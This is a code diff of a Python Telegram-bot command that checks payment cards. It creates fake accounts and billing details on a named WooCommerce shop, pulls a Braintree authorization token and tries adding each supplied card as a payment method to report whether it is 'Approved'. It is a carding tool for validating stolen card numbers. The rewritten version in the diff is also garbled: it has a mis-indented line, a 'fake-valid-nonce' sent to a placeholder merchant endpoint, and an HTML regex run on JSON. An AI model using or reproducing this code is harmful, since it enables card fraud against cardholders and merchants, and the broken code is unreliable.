@@ -10,7 +10,6 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
 def generate_full_name():
     first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour",
                    "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
@@ -59,10 +58,7 @@ def generate_random_code(length=32):
 
 def check_nonsk4(ccx):
     ccx = ccx.strip()
-    n = ccx.split("|")[0]
-    mm = ccx.split("|")[1]
-    yy = ccx.split("|")[2]
-    cvc = ccx.split("|")[3]
+    n, mm, yy, cvc = ccx.split("|")
     if "20" in yy:
         yy = yy.split("20")[1]
         
@@ -70,156 +66,143 @@ def check_nonsk4(ccx):
     r = requests.session()
     r.verify = False
 
-    first_name, last_name = generate_full_name()
-    city, state, street_address, zip_code = generate_address()
-    acc = generate_random_account()
-    username = ''.join(random.choices(string.ascii_lowercase, k=20)) + ''.join(random.choices(string.digits, k=20))
-    num = '303' + ''.join(random.choices(string.digits, k=7))
-    corr = generate_random_code()
-    sess = generate_random_code()
-
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'cache-control': 'no-cache',
-        'pragma': 'no-cache',
-        'user-agent': user,
-    }
-
-    response = r.get('https://forfullflavor.com/my-account/', headers=headers)
-    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
-
-    headers['content-type'] = 'application/x-www-form-urlencoded'
-    data = {
-        'username': username,
-        'email': acc,
-        'woocommerce-register-nonce': register,
-        '_wp_http_referer': '/my-account/',
-        'register': 'Register',
-    }
-
-    response = r.post('https://forfullflavor.com/my-account/', headers=headers, data=data)
-
-    response = r.get('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
-    address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
-
-    data = {
-        'billing_first_name': first_name,
-        'billing_last_name': last_name,
-        'billing_company': '',
-        'billing_country': 'US',
-        'billing_address_1': street_address,
-        'billing_address_2': '',
-        'billing_city': city,
-        'billing_state': state,
-        'billing_postcode': zip_code,
-        'billing_phone': num,
-        'billing_email': acc,
-        'save_address': 'Save address',
-        'woocommerce-edit-address-nonce': address,
-        '_wp_http_referer': '/my-account/edit-address/billing/',
-        'action': 'edit_address',
-    }
-
-    response = r.post('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
-
-    response = r.get('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
-    add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-    client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
-
-    data = {
-        'action': 'wc_braintree_credit_card_get_client_token',
-        'nonce': client,
-    }
-
-    response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
-    enc = response.json()['data']
-    dec = base64.b64decode(enc).decode('utf-8')
-    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
-
-    headers = {
-        'authority': 'payments.braintree-api.com',
-        'accept': '*/*',
-        'authorization': f'Bearer {au}',
-        'braintree-version': '2018-05-10',
-        'cache-control': 'no-cache',
-        'content-type': 'application/json',
-        'pragma': 'no-cache',
-        'user-agent': user,
-    }
-
-    json_data = {
-    'clientSdkMetadata': {
-        'source': 'client',
-        'integration': 'custom',
-        'sessionId': '9c8cc072-4588-4af4-b73e-a4f0d2af84e4',
-    },
-    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
-    'variables': {
-        'input': {
-            'creditCard': {
-                'number': n,
-                'expirationMonth': mm,
-                'expirationYear': yy,
-                'cvv': cvc,
-            },
-            'options': {
-                'validate': False,
-            },
-        },
-    },
-    'operationName': 'TokenizeCreditCard',
-}
-
-    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-
     try:
-        tok = response.json()['data']['tokenizeCreditCard']['token']
-    except KeyError:
-        return f"Failed to tokenize card: {response.text}"
-
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'cache-control': 'no-cache',
-        'content-type': 'application/x-www-form-urlencoded',
-        'pragma': 'no-cache',
-        'user-agent': user,
-    }
-
-    data = {
-        'payment_method': 'braintree_credit_card',
-        'wc-braintree-credit-card-card-type': 'master-card',
-        'wc-braintree-credit-card-3d-secure-enabled': '',
-        'wc-braintree-credit-card-3d-secure-verified': '',
-        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-        'wc_braintree_credit_card_payment_nonce': tok,
-        'wc_braintree_device_data': '',
-        'wc-braintree-credit-card-tokenize-payment-method': 'true',
-        'woocommerce-add-payment-method-nonce': add_nonce,
-        '_wp_http_referer': '/my-account/add-payment-method/',
-        'woocommerce_add_payment_method': '1',
-    }
-
-    response = r.post('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
-
-    text = response.text
-
-    pattern = r'Status code (.*?)\s*</li>'
-
-    match = re.search(pattern, text)
-    if match:
-        result = match.group(1)
-        if 'risk_threshold' in text:
-            result = "RISK: Retry this BIN later."
-    else:
-        if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
-            result = "1000: Approved✅"
+        # Fetch and parse register nonce
+        response = r.get('https://forfullflavor.com/my-account/', headers={'user-agent': user})
+        response.raise_for_status()
+        register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
+        if register:
+            register = register.group(1)
         else:
-            result = "Error"
+            return "Failed to get register nonce"
 
-    if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
-        return 'Approved'
-    else:
-        return result
+        # Register user
+        data = {
+            'username': generate_random_account(),
+            'email': generate_random_account(),
+            'woocommerce-register-nonce': register,
+            '_wp_http_referer': '/my-account/',
+            'register': 'Register',
+        }
+        response = r.post('https://forfullflavor.com/my-account/', headers={'user-agent': user}, data=data)
+        response.raise_for_status()
+
+        # Fetch and parse address nonce
+        response = r.get('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers={'user-agent': user})
+        response.raise_for_status()
+        address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text)
+        if address:
+            address = address.group(1)
+        else:
+            return "Failed to get address nonce"
+
+        # Update address
+        first_name, last_name = generate_full_name()
+        city, state, street_address, zip_code = generate_address()
+        num = '303' + ''.join(random.choices(string.digits, k=7))
+        acc = generate_random_account()
+        data = {
+            'billing_first_name': first_name,
+            'billing_last_name': last_name,
+            'billing_company': '',
+            'billing_country': 'US',
+            'billing_address_1': street_address,
+            'billing_address_2': '',
+            'billing_city': city,
+            'billing_state': state,
+            'billing_postcode': zip_code,
+            'billing_phone': num,
+            'billing_email': acc,
+            'save_address': 'Save address',
+            'woocommerce-edit-address-nonce': address,
+            '_wp_http_referer': '/my-account/edit-address/billing/',
+            'action': 'edit_address',
+        }
+        response = r.post('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers={'user-agent': user}, data=data)
+        response.raise_for_status()
+
+        # Fetch and parse add payment method nonce
+        response = r.get('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers={'user-agent': user})
+        response.raise_for_status()
+        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
+        if add_nonce:
+            add_nonce = add_nonce.group(1)
+        else:
+            return "Failed to get add payment method nonce"
+        
+        client = re.search(r'client_token_nonce":"([^"]+)"', response.text)
+        if client:
+            client = client.group(1)
+        else:
+            return "Failed to get client token nonce"
+
+        # Tokenize card
+        data = {
+            'action': 'wc_braintree_credit_card_get_client_token',
+            'nonce': client,
+        }
+                response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers={'user-agent': user}, data=data)
+        response.raise_for_status()
+        enc = response.json().get('data')
+        if enc:
+            dec = base64.b64decode(enc).decode('utf-8')
+            au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
+            if au:
+                au = au[0]
+            else:
+                return "Failed to get authorization fingerprint"
+        else:
+            return "Failed to get token data"
+
+        # Process payment
+        headers = {
+            'authority': 'payments.braintree-api.com',
+            'accept': '*/*',
+            'authorization': f'Bearer {au}',
+            'braintree-version': 'v1',
+            'content-type': 'application/json',
+            'user-agent': user,
+            'origin': 'https://forfullflavor.com',
+            'referer': 'https://forfullflavor.com/my-account/add-payment-method/',
+        }
+
+        payment_data = {
+            'payment_method_nonce': 'fake-valid-nonce',
+            'amount': '1.00',
+            'currency': 'USD',
+            'options': {
+                'submit_for_settlement': True
+            }
+        }
+
+        payment_response = r.post('https://payments.braintree-api.com/merchants/merchant_id/transactions', headers=headers, json=payment_data)
+        payment_response.raise_for_status()
+        payment_result = payment_response.json()
+
+        # Determine the result based on payment response
+        text = payment_result.get('message', '')
+        pattern = r'Status code (.*?)\s*</li>'
+
+        match = re.search(pattern, text)
+        if match:
+            result = match.group(1)
+            if 'risk_threshold' in text:
+                result = "RISK: Retry this BIN later."
+        else:
+            if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+                result = "1000: Approved✅"
+            else:
+                result = "Error"
+
+        if any(keyword in result.lower() for keyword in ['success', 'successfully', 'thank you', 'thanks', 'approved', 'fund']):
+            return 'Approved'
+        else:
+            return result
+
+    except requests.RequestException as e:
+        return f"Request failed: {str(e)}"
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
 
 def handle_nonsk4_command(bot, message):
     chat_id = message.chat.id
